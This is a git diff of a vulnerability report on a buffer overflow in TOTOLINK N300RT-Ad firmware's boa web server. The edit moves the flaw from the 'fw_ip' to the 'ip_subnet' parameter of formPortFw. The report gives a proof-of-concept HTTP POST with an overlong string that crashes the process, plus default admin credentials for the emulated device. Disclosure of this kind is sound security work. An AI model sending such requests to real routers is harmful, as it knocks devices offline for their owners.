@@ -1,11 +1,11 @@
 ## **Description**
 
-A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'fw_ip'` parameter in the 'formPortFw' interface of the file boa.
+A buffer overflow vulnerability was discovered in the TOTOLINK firmware N300RT-Ad-V4.0.0-B20211109.1137. The vulnerability arises from the improper input validation of the `'ip_subnet'` parameter in the 'formPortFw' interface of the file boa.
 
 ## ​**Affected Product**
 
 - ​**Brand**: TOTOLINK
-- ​**Product**: N300RT-Ad
+- ​**Product**: N300RT
 - ​**Version**: V4.0.0-B20211109.1137
 
 The firmware can be downloaded from the official website.  
@@ -21,14 +21,14 @@ sudo ./run.sh -d totolink ../FIRMWARE/TOTOLINK-N300RT-Ad-V4.0.0-B20211109.1137.w
 - ​**Password**: `admin`
 
 The result of the simulation is as follows: 
-![sim_res](work_record/TOTOLINK/N300RT_ad/8/img/sim_res.png)
+![sim_res](work_record/TOTOLINK/N300RT_ad/7/img/sim_res.png)
 
 ## ​**Vulnerability Analysis**
 
 ### ​**Key Vulnerable Code**
 
 Using ghidra we known that the vulnerability code in function 'FUN_00415ae0' is below:
-![vulner_code.png](work_record/TOTOLINK/N300RT_ad/8/img/vulner_code.png)
+![vulner_code.png](work_record/TOTOLINK/N300RT_ad/7/img/vulner_code.png)
 - ​**web_get_var** retrieves POST parameters.
 - **sprintf()** is used without length checks, leading to a ​buffer overflow.​
 
@@ -51,8 +51,8 @@ Referer: http://192.168.0.1/wlwps.htm
 Cookie: session=1335027320  
 Upgrade-Insecure-Requests: 1  
   
-addPortFw=1&fw_ip=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&ip_subnet=1
+addPortFw=1&fw_ip=1&ip_subnet=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 After the request the `boa` process will crash.
-![result](work_record/TOTOLINK/N300RT_ad/8/img/result.png)
+![result](work_record/TOTOLINK/N300RT_ad/7/img/result.png)
